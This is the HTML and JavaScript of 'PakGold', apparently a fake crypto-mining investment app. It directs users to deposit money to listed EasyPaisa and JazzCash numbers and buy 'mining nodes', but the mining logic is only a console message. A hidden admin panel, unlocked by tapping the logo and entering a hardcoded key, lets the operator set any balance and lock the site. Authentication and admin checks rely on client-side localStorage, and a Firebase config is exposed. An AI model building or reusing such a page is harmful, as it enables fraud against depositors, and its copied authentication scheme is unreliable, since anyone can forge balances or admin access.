<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>PakGold | Professional Mining Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #06090f; color: #f0f6fc; padding-bottom: 90px; }
        .sky-card { background: #0d1117; border: 1px solid #30363d; border-radius: 20px; transition: 0.3s; }
        .page { display: none; }
        .active-page { display: block !important; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .btn-gold { background: linear-gradient(135deg, #fbbf24, #d97706); color: #000; font-weight: 800; border-radius: 12px; }
        .nav-active { color: #fbbf24 !important; border-top: 2px solid #fbbf24; }
        input { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 12px; color: white; width: 100%; outline: none; }
    </style>
</head>
<body>

    <div id="lock-screen" class="hidden fixed inset-0 z-[10000] bg-black/95 flex flex-col items-center justify-center p-8 text-center">
        <h2 id="lock-title" class="text-2xl font-black text-red-500 uppercase italic">System Restricted</h2>
        <p id="lock-msg" class="text-xs opacity-60 mt-2 font-bold uppercase tracking-widest">Maintenance in progress...</p>
    </div>

    <main id="app-ui" class="hidden">
        
        <header class="p-6 sticky top-0 bg-[#06090f]/90 backdrop-blur-md z-[5000] border-b border-white/5">
            <div class="flex justify-between items-center mb-6">
                <h1 onclick="adminAccess()" class="text-xl font-black text-yellow-500 italic uppercase">PAK<span class="text-white">GOLD</span></h1>
                <button onclick="logout()" class="bg-red-500/10 text-red-500 text-[9px] font-black px-4 py-2 rounded-xl uppercase">Logout</button>
            </div>
            <div class="sky-card p-6 bg-gradient-to-br from-[#1c2128] to-[#0d1117]">
                <p class="text-[8px] font-bold opacity-40 uppercase tracking-[3px]">Account Assets</p>
                <h2 class="text-4xl font-black mt-1 tracking-tighter" id="u-bal">₨ 0.00</h2>
                <div class="grid grid-cols-2 gap-3 mt-6">
                    <button onclick="showPage('fund')" class="p-3 bg-yellow-500 text-black rounded-xl text-[10px] font-black uppercase">Recharge</button>
                    <button onclick="showPage('fund')" class="p-3 bg-white/5 rounded-xl text-[10px] font-black uppercase border border-white/10">Withdraw</button>
                </div>
            </div>
        </header>

        <div class="p-4 space-y-6">
            <div id="p-home" class="page active-page space-y-4">
                <div class="flex gap-2 p-1 bg-white/5 rounded-xl">
                    <button onclick="renderNodes('std')" id="b-std" class="flex-1 py-3 text-[10px] font-black uppercase rounded-lg bg-yellow-500 text-black">Standard</button>
                    <button onclick="renderNodes('vip')" id="b-vip" class="flex-1 py-3 text-[10px] font-black uppercase rounded-lg opacity-40">VIP Nodes</button>
                </div>
                <div id="m-grid" class="space-y-4"></div>
            </div>

            <div id="p-fund" class="page space-y-4">
                <div class="sky-card p-6">
                    <h3 class="text-yellow-500 font-black text-xs uppercase mb-6 tracking-widest">Payment Methods</h3>
                    <div class="space-y-3 mb-6 font-bold text-[11px]">
                        <div class="flex justify-between p-4 bg-white/5 rounded-xl border-l-4 border-yellow-500"><span>EasyPaisa</span><span>03379827882</span></div>
                        <div class="flex justify-between p-4 bg-white/5 rounded-xl border-l-4 border-yellow-600"><span>JazzCash</span><span>03705519562</span></div>
                    </div>
                    <input type="number" id="amt" placeholder="Deposit Amount" class="mb-2">
                    <input type="text" id="tid" placeholder="Transaction ID (TID)" class="mb-4">
                    <button class="w-full p-4 btn-gold uppercase text-[10px] tracking-widest shadow-xl">Confirm Recharge</button>
                </div>
            </div>

            <div id="p-admin" class="page space-y-4">
                <div class="sky-card p-6 border-red-500/20">
                    <h3 class="text-red-500 font-black text-xs uppercase mb-4 tracking-widest">Administration Dashboard</h3>
                    <div class="space-y-4">
                        <button onclick="toggleSystem()" id="sys-btn" class="w-full p-4 bg-red-500/20 text-red-500 rounded-xl text-[9px] font-black uppercase">System Online</button>
                        <div class="h-[1px] bg-white/5"></div>
                        <input type="text" id="adm-target" placeholder="User ID">
                        <input type="number" id="adm-val" placeholder="New Balance">
                        <button onclick="modifyBalance()" class="w-full p-4 bg-blue-500 text-white rounded-xl text-[9px] font-black uppercase tracking-widest">Update User Balance</button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <nav id="nav-ui" class="hidden fixed bottom-0 w-full p-4 flex justify-around items-center bg-[#0d1117]/95 border-t border-white/5 rounded-t-[2.5rem] z-[5000]">
        <button onclick="showPage('home')" id="n-home" class="flex flex-col items-center gap-1 nav-active pt-2">
            <span class="text-xl">⚡</span><span class="text-[7px] font-black uppercase">Nodes</span>
        </button>
        <button onclick="showPage('fund')" id="n-fund" class="flex flex-col items-center gap-1 opacity-40 pt-2">
            <span class="text-xl">💰</span><span class="text-[7px] font-black uppercase">Assets</span>
        </button>
        <button onclick="showPage('admin')" id="n-admin" class="hidden flex flex-col items-center gap-1 opacity-40 pt-2 text-red-500">
            <span class="text-xl">⚙️</span><span class="text-[7px] font-black uppercase">Admin</span>
        </button>
    </nav>

    <script>
        // --- CORE FIREBASE ---
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // --- AUTH & AUTO-PROFIT LOGIC ---
        async function runAutoProfit(userId) {
            const userRef = db.collection("users").doc(userId);
            const userDoc = await userRef.get();
            if(userDoc.exists && userDoc.data().active_machines) {
                // Logic to increment balance based on time interval
                console.log("Mining Active...");
            }
        }

        function checkUser() {
            const current = localStorage.getItem('pg_user');
            if(current) {
                document.getElementById('app-ui').classList.remove('hidden');
                document.getElementById('nav-ui').classList.remove('hidden');
                db.collection("users").doc(current).onSnapshot(d => {
                    if(d.exists) {
                        document.getElementById('u-bal').innerText = "₨ " + (d.data().balance || 0).toLocaleString();
                        if(d.data().banned) showLock("BANNED", "This account has been restricted.");
                    }
                });
                if(localStorage.getItem('is_admin') === 'true') document.getElementById('n-admin').classList.remove('hidden');
                runAutoProfit(current);
            } else {
                let n = prompt("Enter Username:");
                if(n) { localStorage.setItem('pg_user', n.toLowerCase()); location.reload(); }
            }
        }

        // --- ADMIN SECRETS ---
        let taps = 0;
        function adminAccess() {
            taps++;
            if(taps === 10) {
                let p = prompt("Admin Key:");
                if(p === "786") { localStorage.setItem('is_admin', 'true'); location.reload(); }
            }
        }

        async function toggleSystem() {
            const ref = db.collection("settings").doc("system");
            const d = await ref.get();
            await ref.set({ maintenance: !d.data().maintenance });
            alert("Status Updated");
        }

        async function modifyBalance() {
            const u = document.getElementById('adm-target').value.toLowerCase();
            const b = parseFloat(document.getElementById('adm-val').value);
            await db.collection("users").doc(u).update({ balance: b });
            alert("Balance Synced");
        }

        // --- UI RENDER ---
        function renderNodes(type) {
            const grid = document.getElementById('m-grid');
            grid.innerHTML = '';
            for(let i=1; i<=10; i++) {
                let cost = type==='std' ? 200 + (i*1000) : 50000 + (i*50000);
                grid.innerHTML += `
                <div class="sky-card p-5 border-l-4 ${type==='std'?'border-yellow-500':'border-green-500'} flex justify-between items-center">
                    <div><p class="text-[9px] font-black text-yellow-500 uppercase">${type==='std'?'S-NODE':'VIP'} ${i}</p><p class="text-sm font-black">₨ ${cost.toLocaleString()}</p></div>
                    <button class="px-5 py-2 btn-gold text-[8px] uppercase">Activate</button>
                </div>`;
            }
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('nav button').forEach(b => { b.classList.add('opacity-40'); b.classList.remove('nav-active'); });
            document.getElementById('n-'+p).classList.remove('opacity-40');
            document.getElementById('n-'+p).classList.add('nav-active');
        }

        function showLock(t, m) {
            document.getElementById('lock-screen').classList.remove('hidden');
            document.getElementById('lock-title').innerText = t;
            document.getElementById('lock-msg').innerText = m;
        }

        function logout() { localStorage.clear(); location.reload(); }
        window.onload = () => { checkUser(); renderNodes('std'); }
    </script>
</body>
</html>
